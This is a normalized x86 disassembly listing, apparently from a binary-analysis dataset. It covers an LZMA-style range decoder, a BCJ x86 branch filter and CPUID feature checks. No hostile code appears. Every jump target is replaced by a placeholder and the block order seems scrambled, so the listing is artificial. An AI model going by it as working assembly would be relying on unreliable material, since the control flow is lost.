mov edi edx
mov ebx ecx
cmp edi 0x4
jae r-xdata
push esi
sub edi 0x4
xor esi esi
xor eax eax
jmp r-xdata
add esi 0x4
cmp esi edi
jbe r-xdata
movzx edx [ esi + ebx + 0x2 ]
movzx eax [ esi + ebx + 0x1 ]
shl edx 0x8
or edx eax
movzx eax [ esi + ebx ]
shl edx 0x8
or edx eax
shl edx 0x2
sub edx esi
sub edx 0x8
shr edx 0x2
mov eax edx
shr eax 0x10
mov ecx edx
shr ecx 0x8
mov [ esi + ebx + 0x2 ] al
mov [ esi + ebx + 0x1 ] cl
mov [ esi + ebx ] dl
pop edi
pop ebx
retn
cmp [ esi + ebx + 0x3 ] 0xeb
jne r-xdata
mov eax esi
pop esi
sub_406ca3
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x20 ]
push edi
mov esi [ esi ]
mov ebx ecx
xor edi edi
and esi 0x7
mov [ esp + 0x18 ] ebx
cmp edx 0x5
jae r-xdata
push ebp
lea ecx [ edx - 0x4 ]
or ebp 0xffffffff
add ecx ebx
mov [ esp + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp edx ecx
jb r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov al [ edx ]
and al 0xfe
cmp al 0xe8
je r-xdata
mov edi edx
sub edi ebx
cmp edx ecx
jae r-xdata
inc edx
mov edx edi
sub edx ebp
xor eax eax
lea ecx [ edx - 0x1 ]
shl esi cl
pop ebp
and esi 0x7
cmp edx 0x3
cmova esi eax
mov eax [ esp + 0x24 ]
mov [ eax ] esi
mov eax edi
mov ecx edi
sub ecx ebp
cmp ecx 0x3
jbe r-xdata
dec ecx
shl esi cl
and esi 0x7
je r-xdata
xor esi esi
mov al [ edx + 0x4 ]
mov ebp edi
test al al
je r-xdata
movzx eax [ esi + r--data ]
mov ecx edx
sub ecx eax
cmp [ esi + r--data ] 0x0
mov al [ ecx + 0x4 ]
je r-xdata
movzx ebx al
movzx eax [ edx + 0x3 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x2 ]
shl ebx 0x8
or ebx eax
movzx eax [ edx + 0x1 ]
shl ebx 0x8
or ebx eax
cmp al 0xff
jne r-xdata
mov ebp edi
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax ebx
shr eax 0x18
and al 0x1
dec al
not al
mov [ edx + 0x4 ] al
mov eax ebx
shr eax 0x10
mov [ edx + 0x3 ] al
mov eax ebx
shr eax 0x8
mov [ edx + 0x1 ] bl
mov ebx [ esp + 0x1c ]
mov [ edx + 0x2 ] al
add edi 0x5
jmp r-xdata
movzx eax [ esi + r--data ]
shl eax 0x3
push 0x18
pop ecx
sub ecx eax
mov [ esp + 0x14 ] eax
mov eax ebx
shr eax cl
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
and esi 0x3
add esi esi
or esi 0x1
inc edi
jmp r-xdata
lea edx [ edi + ebx ]
jmp r-xdata
cmp al 0xff
jne r-xdata
push 0x20
xor ebx ebx
pop ecx
sub ecx [ esp + 0x14 ]
inc ebx
shl ebx cl
dec ebx
xor ebx [ esp + 0x18 ]
jmp r-xdata
cmp al 0xff
jne r-xdata
sub ebx edi
sub ebx 0x5
mov [ esp + 0x18 ] ebx
test esi esi
je r-xdata
sub_406dfe
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
pushfd
pop eax
mov edx eax
xor eax [ ebp - 0x4 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
leave
retn
sub_406e1c
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] ecx
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
cpuid
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ ecx ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] eax
pop ebx
leave
retn
sub_406e61
push esi
mov esi ecx
mov ecx 0x40000
call sub_406dfe
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov ecx 0x200000
call sub_406dfe
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
lea eax [ esi + 0xc ]
push eax
lea eax [ esi + 0x4 ]
push eax
mov edx esi
xor ecx ecx
call sub_406e1c
lea eax [ esi + 0x1c ]
push eax
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x14 ]
xor ecx ecx
push eax
lea edx [ esi + 0x10 ]
inc ecx
call sub_406e1c
add esp 0x18
xor eax eax
inc eax
pop esi
retn
sub_406eb8
push ebx
mov ebx [ ecx + 0x4 ]
push esi
xor esi esi
push edi
mov edx rw-data
mov edi esi
add edi 0xc
inc esi
add edx 0xc
cmp edi 0x24
jb r-xdata
mov eax [ edx - 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
cmp [ edx - 0x8 ] ebx
jne r-xdata
or eax 0xffffffff
mov eax [ edx ]
cmp eax [ ecx + 0xc ]
je r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_406ef2
push ebp
mov ebp esp
sub esp 0x20
lea ecx [ ebp - 0x20 ]
push esi
push edi
call sub_406e61
test eax eax
je r-xdata
xor eax eax
inc eax
mov edi [ ebp - 0x10 ]
mov esi edi
shr esi 0x8
shr edi 0x4
lea ecx [ ebp - 0x20 ]
and esi 0xff00f
and edi 0xf00f
call sub_406eb8
mov ecx eax
xor eax eax
sub ecx eax
je r-xdata
cmp esi 0x6
jb r-xdata
dec ecx
je r-xdata
jne r-xdata
cmp esi 0x5
jb r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi 0x100c
jne r-xdata
cmp esi 0x6
jb r-xdata
cmp edi 0x6
jb r-xdata
jne r-xdata
cmp edi 0xa
jmp r-xdata
cmp edi 0xf
jae r-xdata
jne r-xdata
jmp r-xdata
sub_406f68
push esi
mov esi edx
cmp cl 0x28
jbe r-xdata
jne r-xdata
push 0x4
pop eax
pop esi
retn
movzx edx cl
mov ecx edx
shr ecx 0x1
and edx 0x1
add ecx 0xb
or edx 0x2
shl edx cl
or edx 0xffffffff
jmp r-xdata
mov eax edx
shr eax 0x8
mov [ esi + 0x2 ] al
mov eax edx
mov [ esi + 0x1 ] dl
shr eax 0x10
shr edx 0x18
mov [ esi + 0x3 ] al
mov [ esi ] 0x4
mov [ esi + 0x4 ] dl
xor eax eax
pop esi
retn
sub_406fae
push ebp
mov ebp esp
push ecx
push ecx
mov al dl
push esi
mov esi ecx
lea edx [ ebp - 0x8 ]
mov cl al
call sub_406f68
test eax eax
jne r-xdata
pop esi
leave
retn
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push 0x5
mov ecx esi
call sub_408a4e
pop ecx
pop ecx
sub_406ff8
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x78 ]
push edi
sub eax ebx
je r-xdata
mov [ esi + 0x7c ] dl
test dl dl
jne r-xdata
dec eax
je r-xdata
js r-xdata
push 0x8
movzx eax dl
shl eax 0x8
or [ esi + 0x74 ] eax
push 0x2
jmp r-xdata
dec eax
je r-xdata
movzx eax dl
and eax 0x1f
shl eax 0x10
mov [ esi + 0x74 ] eax
and dl 0x7f
cmp dl 0x2
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
pop eax
jmp r-xdata
movzx eax dl
or eax [ esi + 0x74 ]
push 0x3
inc eax
test [ esi + 0x7c ] 0x80
mov [ esi + 0x74 ] eax
pop eax
push 0x6
pop ecx
cmove eax ecx
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x74 ] ebx
jmp r-xdata
push 0x9
jmp r-xdata
movzx eax dl
shl eax 0x8
mov [ esi + 0x70 ] eax
push 0x4
jmp r-xdata
dec eax
je r-xdata
xor eax eax
inc eax
movzx eax dl
or eax [ esi + 0x70 ]
inc eax
mov [ esi + 0x70 ] eax
mov al [ esi + 0x7c ]
and al 0x60
cmp al 0x40
jb r-xdata
push 0x9
dec eax
jne r-xdata
cmp [ esi + 0x88 ] ebx
push 0x6
pop eax
push 0x9
pop ecx
cmovne eax ecx
jmp r-xdata
push 0x5
jmp r-xdata
cmp dl 0xe1
jae r-xdata
movzx eax dl
cdq
pop ebp
idiv ebp
push 0x5
pop ecx
movzx eax al
mov edi edx
cdq
idiv ecx
mov [ esi + 0x8 ] eax
lea ecx [ edx + edi ]
cmp ecx 0x4
jle r-xdata
mov [ esi ] edi
mov [ esi + 0x4 ] edx
mov [ esi + 0x88 ] ebx
push 0x6
jmp r-xdata
mov eax ebp
jmp r-xdata
sub_4070f2
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
mov eax [ esi + 0x14 ]
add eax [ esi + 0x24 ]
push edx
push eax
call sub_410c10
add [ esi + 0x24 ] edi
add esp 0xc
cmp [ esi + 0x30 ] 0x0
jne r-xdata
add [ esi + 0x2c ] edi
pop edi
pop esi
retn
mov ecx [ esi + 0xc ]
mov eax ecx
sub eax [ esi + 0x2c ]
cmp eax edi
ja r-xdata
mov [ esi + 0x30 ] ecx
sub_407129
sub esp 0x10
push ebx
mov ebx [ esp + 0x24 ]
push ebp
mov ebp [ esp + 0x20 ]
and [ ebx ] 0x0
push esi
push edi
mov edi [ ebp ]
and [ ebp ] 0x0
mov esi ecx
mov [ esp + 0x1c ] edx
cmp [ esi + 0x78 ] 0x8
mov [ esp + 0x18 ] edi
je r-xdata
mov [ ebx ] 0x1
mov eax [ esi + 0x78 ]
mov edx [ esi + 0x24 ]
mov [ esp + 0x14 ] edx
cmp eax 0x9
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x6
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esp + 0x1c ]
sub edi [ ebp ]
and [ esp + 0x30 ] 0x0
sub ecx edx
mov edx [ esi + 0x74 ]
mov [ esp + 0x28 ] ecx
cmp edx ecx
ja r-xdata
cmp eax 0x7
je r-xdata
mov cl [ esi + 0x7c ]
test cl cl
js r-xdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x30 ] 0x1
mov eax [ ebp ]
cmp eax edi
je r-xdata
cmp eax 0x6
jne r-xdata
mov edx [ esp + 0x18 ]
cmp [ ebp ] edx
je r-xdata
mov [ ebx ] 0x3
jmp r-xdata
mov edi [ esp + 0x24 ]
inc eax
mov dl [ edi ]
mov ecx esi
mov [ ebp ] eax
call sub_406ff8
inc edi
mov [ esi + 0x78 ] eax
mov [ esp + 0x24 ] edi
jmp r-xdata
cmp edi [ esi + 0x70 ]
mov ecx [ esp + 0x14 ]
cmova edi [ esi + 0x70 ]
mov edx [ esp + 0x28 ]
push ebx
push [ esp + 0x34 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x2c ]
push eax
lea edx [ edx + ecx ]
push edi
mov ecx esi
call sub_408748
mov edx [ esi + 0x24 ]
mov ecx [ esp + 0x20 ]
sub edx [ esp + 0x24 ]
add [ ebp ] ecx
sub [ esi + 0x70 ] ecx
sub [ esi + 0x74 ] edx
add edi ecx
add esp 0x10
mov [ esp + 0x24 ] edi
test eax eax
jne r-xdata
movzx eax cl
shr eax 0x5
and eax 0x3
xor edx edx
cmp eax 0x3
sete dl
xor ecx ecx
test eax eax
setg cl
test edx edx
jne r-xdata
cmp eax 0x6
jne r-xdata
xor eax eax
cmp [ esi + 0x78 ] 0x8
je r-xdata
cmp [ ebx ] 0x3
je r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x80 ] edx
jne r-xdata
cmp edi [ esp + 0x28 ]
cmova edi [ esp + 0x28 ]
test edi edi
je r-xdata
xor edx edx
cmp cl 0x1
sete dl
test edx edx
je r-xdata
mov edi [ esp + 0x18 ]
jmp r-xdata
test ecx ecx
jne r-xdata
push ecx
mov ecx esi
call sub_4086c4
and [ esi + 0x80 ] 0x0
add esp 0x4
and [ esi + 0x84 ] 0x0
mov [ esi + 0x78 ] 0x7
cmp [ esi + 0x84 ] ecx
jne r-xdata
mov edx [ esp + 0x24 ]
push edi
mov ecx esi
call sub_4070f2
sub [ esi + 0x74 ] edi
add [ esp + 0x28 ] edi
add [ ebp ] edi
mov eax [ esi + 0x74 ]
neg eax
sbb eax eax
and eax 0x7
pop ecx
mov [ esi + 0x78 ] eax
jmp r-xdata
cmp [ esi + 0x80 ] 0x0
jne r-xdata
xor eax eax
inc eax
mov [ esi + 0x84 ] eax
mov [ esi + 0x88 ] eax
jmp r-xdata
cmp [ ebx ] 0x4
jne r-xdata
test edx edx
jne r-xdata
and [ esi + 0x80 ] 0x0
push 0x0
mov ecx esi
call sub_4086c4
add esp 0x4
mov [ ebx ] 0x2
cmp [ ebx ] 0x4
jne r-xdata
cmp [ esi + 0x74 ] edx
jne r-xdata
cmp [ esi + 0x70 ] edx
jne r-xdata
and [ esi + 0x78 ] edx
sub_407355
sub esp 0x54
push ebx
push ebp
push esi
push edi
mov [ esp + 0x50 ] edx
mov eax ecx
mov [ esp + 0x54 ] eax
mov ecx [ eax + 0x10 ]
mov [ esp + 0x18 ] ecx
mov ecx [ eax + 0x38 ]
mov [ esp + 0x2c ] ecx
mov ecx [ eax + 0x3c ]
mov [ esp + 0x34 ] ecx
mov ecx [ eax + 0x40 ]
mov [ esp + 0x38 ] ecx
mov ecx [ eax + 0x44 ]
xor ebx ebx
mov [ esp + 0x44 ] ecx
mov ecx [ eax + 0x8 ]
inc ebx
shl ebx cl
mov ecx [ eax + 0x4 ]
mov ebp [ eax + 0x18 ]
dec ebx
mov [ esp + 0x58 ] ebx
xor ebx ebx
inc ebx
shl ebx cl
mov ecx [ eax ]
mov [ esp + 0x4c ] ecx
mov ecx [ eax + 0x14 ]
mov [ esp + 0x3c ] ecx
mov ecx [ eax + 0x28 ]
dec ebx
and [ esp + 0x28 ] 0x0
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x24 ]
mov esi [ eax + 0x20 ]
mov edx [ eax + 0x34 ]
mov [ esp + 0x5c ] ebx
mov ebx [ eax + 0x2c ]
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x30 ]
mov edi [ eax + 0x1c ]
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x14 ] ebp
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ eax + edx * 2 ] cx
mov edx [ esp + 0x1c ]
movzx ecx [ eax + edx * 2 + 0x180 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
cmp [ esp + 0x48 ] 0x0
mov ecx [ esp + 0x18 ]
lea ebx [ ecx + 0xe6c ]
mov [ ecx + edx * 2 ] ax
mov [ esp + 0x10 ] ebx
jne r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
mov ecx [ esp + 0x24 ]
test ecx ecx
mov eax ecx
cmove eax [ esp + 0x30 ]
mov ecx [ esp + 0x3c ]
push 0x8
movzx edx [ eax + ecx - 0x1 ]
mov eax [ esp + 0x24 ]
and eax [ esp + 0x60 ]
pop ecx
sub cl [ esp + 0x4c ]
shr edx cl
mov ecx [ esp + 0x4c ]
shl eax cl
add edx eax
imul edx edx 0x600
add ebx edx
mov [ esp + 0x10 ] ebx
cmp [ esp + 0x20 ] 0x0
je r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
cmp [ esp + 0x48 ] 0x0
mov eax [ esp + 0x18 ]
mov [ eax + edx * 2 + 0x180 ] cx
jne r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
add edx 0xc
mov [ ecx + edx * 2 + 0x168 ] ax
add ecx 0x664
jmp r-xdata
mov ebx [ esp + 0x24 ]
cmp ebx [ esp + 0x2c ]
mov edx [ esp + 0x54 ]
sbb eax eax
and eax [ esp + 0x30 ]
sub eax [ esp + 0x2c ]
add eax [ edx + 0x14 ]
cmp ecx 0xa
mov edx 0x100
movzx ebp [ eax + ebx ]
sbb eax eax
and eax 0xfffffffd
add eax 0x6
sub ecx eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x1c ] ecx
xor ecx ecx
mov [ esp + 0x40 ] edx
inc ecx
cmp ecx 0x4
push 0x3
pop eax
cmovb eax ecx
sub ecx eax
mov [ esp + 0x1c ] ecx
xor ecx ecx
inc ecx
mov ecx [ esp + 0x1c ]
cmp ecx 0x7
jae r-xdata
movzx edx [ eax + edx * 2 + 0x198 ]
cmp edi 0x1000000
jae r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov [ esp + 0x1c ] edx
movzx edx [ ecx ]
cmp edi 0x1000000
jae r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ esp + 0x14 ]
shl esi 0x8
movzx eax [ eax ]
shl edi 0x8
or esi eax
inc [ esp + 0x14 ]
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp esi ecx
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
xor eax eax
inc eax
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ esp + 0x10 ]
lea ecx [ ecx * 2 + 0x1 ]
mov [ eax + ebp * 2 ] dx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ esp + 0x10 ]
add ecx ecx
mov [ edx + ebp * 2 ] ax
not ebx
mov eax edx
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ecx + ebx ] dx
inc ecx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ecx + ebx ] ax
jmp r-xdata
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ esp + 0x1c ]
sub edi ecx
sub esi ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + eax * 2 + 0x198 ] dx
mov edx eax
movzx ecx [ ecx + edx * 2 + 0x1b0 ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ esp + 0x18 ]
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ esp + 0x1c ]
mov edi ecx
mov [ ebx + edx * 2 + 0x198 ] ax
mov eax [ esp + 0x18 ]
lea ebx [ edx + 0xf ]
shl ebx 0x4
add ebx [ esp + 0x40 ]
movzx edx [ eax + ebx * 2 ]
cmp ecx 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ecx ] dx
movzx edx [ ecx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
shl ebx 0x4
lea edx [ ecx + 0x4 ]
add edx ebx
mov [ ecx ] ax
xor ebx ebx
add ebp ebp
mov ebx edx
and ebx ebp
mov [ esp + 0x60 ] ebp
lea ebp [ ebx + edx ]
add ebp ecx
movzx edx [ eax + ebp * 2 ]
cmp edi 0x1000000
jae r-xdata
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x3c ]
mov ebx [ esp + 0x20 ]
mov [ eax + ebp ] cl
inc ebp
inc ebx
mov [ esp + 0x20 ] ebx
jmp r-xdata
mov edx [ esp + 0x40 ]
mov ebp [ esp + 0x60 ]
and edx ebx
mov [ esp + 0x40 ] edx
cmp ecx 0x100
jb r-xdata
add ecx ecx
movzx edx [ ecx + ebx ]
cmp edi 0x1000000
jae r-xdata
mov [ esp + 0x14 ] ebp
jmp r-xdata
cmp ecx 0x100
jb r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
xor ecx ecx
mov [ esp + 0x40 ] ebx
mov ebx [ esp + 0x14 ]
inc ecx
mov [ esp + 0x24 ] ebp
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ eax + edx * 2 + 0x1b0 ] cx
movzx ecx [ eax + edx * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + edx * 2 + 0x1b0 ] ax
mov eax [ esp + 0x34 ]
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ esp + 0x18 ]
mov [ eax + ebx * 2 ] dx
mov ebx [ esp + 0x40 ]
mov edx [ esp + 0x1c ]
jmp r-xdata
mov ebp [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
cmp ebp [ esp + 0x2c ]
mov [ ecx + ebx * 2 ] ax
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x20 ]
sbb eax eax
and eax [ esp + 0x30 ]
sub eax [ esp + 0x2c ]
add eax ebp
mov al [ eax + ecx ]
mov [ ecx + ebp ] al
inc ebp
inc ebx
cmp [ esp + 0x1c ] 0x7
mov [ esp + 0x24 ] ebp
sbb edx edx
and edx 0xfffffffe
add edx 0xb
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] edx
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
push 0x10
mov [ ecx + 0x2 ] dx
lea edx [ ecx + 0x204 ]
pop ebx
mov ebp 0x100
mov edi eax
mov eax 0x800
sub eax edx
shl ebx 0x4
shr eax 0x5
add eax edx
lea edx [ ebx + 0x104 ]
push 0x8
mov [ ecx + 0x2 ] ax
add edx ecx
pop ebx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x14 ]
cmp ebp [ esp + 0x68 ]
jb r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebp
mov [ esp + 0x14 ] ebp
mov ecx [ esp + 0x2c ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x34 ] ecx
cmp edx 0x7
sbb edx edx
and edx 0xfffffffd
add edx 0xb
lea ecx [ eax + 0xa68 ]
cmp ebp [ esp + 0x50 ]
jae r-xdata
push 0x8
pop ebp
jmp r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x28 ]
mov [ eax + edx ] cx
mov ecx eax
inc ecx
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x28 ]
mov [ ecx + edx ] ax
jmp r-xdata
mov eax [ esp + 0x54 ]
mov [ eax + 0x18 ] ecx
mov ecx [ esp + 0x20 ]
mov [ eax + 0x2c ] ecx
mov ecx [ esp + 0x2c ]
mov [ eax + 0x48 ] ebx
mov ebx [ esp + 0x24 ]
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] esi
mov [ eax + 0x24 ] ebx
mov [ eax + 0x38 ] ecx
mov ecx [ esp + 0x34 ]
mov [ eax + 0x3c ] ecx
mov ecx [ esp + 0x38 ]
mov [ eax + 0x40 ] ecx
mov ecx [ esp + 0x44 ]
mov [ eax + 0x44 ] ecx
mov [ eax + 0x34 ] edx
xor eax eax
jmp r-xdata
movzx eax [ ecx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ecx
and ebx [ esp + 0x58 ]
mov eax [ esp + 0x18 ]
shl edx 0x4
add edx ebx
mov [ esp + 0x40 ] ebx
movzx ecx [ eax + edx * 2 ]
cmp edi 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ eax + edx * 2 + 0x1c8 ] cx
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x44 ]
mov [ esp + 0x44 ] ecx
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + edx * 2 + 0x1c8 ] ax
mov eax [ esp + 0x38 ]
jmp r-xdata
add ecx ecx
mov [ esp + 0x28 ] ecx
movzx ecx [ ecx + edx ]
cmp edi 0x1000000
jae r-xdata
mov [ esp + 0x14 ] ebx
mov ebx [ esp + 0x40 ]
sub ebx ebp
add ecx ebx
cmp [ esp + 0x1c ] 0xc
mov [ esp + 0x10 ] esi
mov [ esp + 0x28 ] ecx
jb r-xdata
cmp ecx ebp
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn 0x4
mov ecx [ esp + 0x34 ]
mov [ esp + 0x38 ] ecx
mov ebx [ esp + 0x2c ]
mov ebp [ esp + 0x14 ]
cmp ecx 0x4
push 0x3
pop eax
cmovb eax ecx
mov ecx [ esp + 0x18 ]
shl eax 0x7
add ecx 0x360
add ecx eax
movzx edx [ ecx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
sub eax ebp
cmp eax ecx
mov edx ecx
cmovb edx eax
cmp ebp ebx
sbb ecx ecx
and ecx [ esp + 0x30 ]
add [ esp + 0x20 ] edx
sub [ esp + 0x28 ] edx
sub ecx ebx
mov ebx [ esp + 0x3c ]
add ecx ebp
lea eax [ ecx + edx ]
cmp eax [ esp + 0x30 ]
ja r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
mov esi [ esp + 0x30 ]
add ebx ebp
sub ecx ebp
add [ esp + 0x24 ] edx
lea ebp [ ebx + edx ]
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ esp + 0x10 ] esi
mov [ ecx + 0x2 ] dx
push 0x3
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ecx + 0x2 ] ax
push 0x2
jmp r-xdata
mov al [ ecx + ebx ]
mov [ ebx + ebp ] al
inc ebp
inc ecx
xor eax eax
cmp ecx esi
cmove ecx eax
dec edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov ebx [ esp + 0x20 ]
mov al [ ecx + ebx ]
mov [ ebx ] al
inc ebx
cmp ebx ebp
jne r-xdata
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
pop ebx
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
mov edx [ esp + 0x1c ]
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ esp + 0x10 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ esp + 0x10 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebp ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] ebp
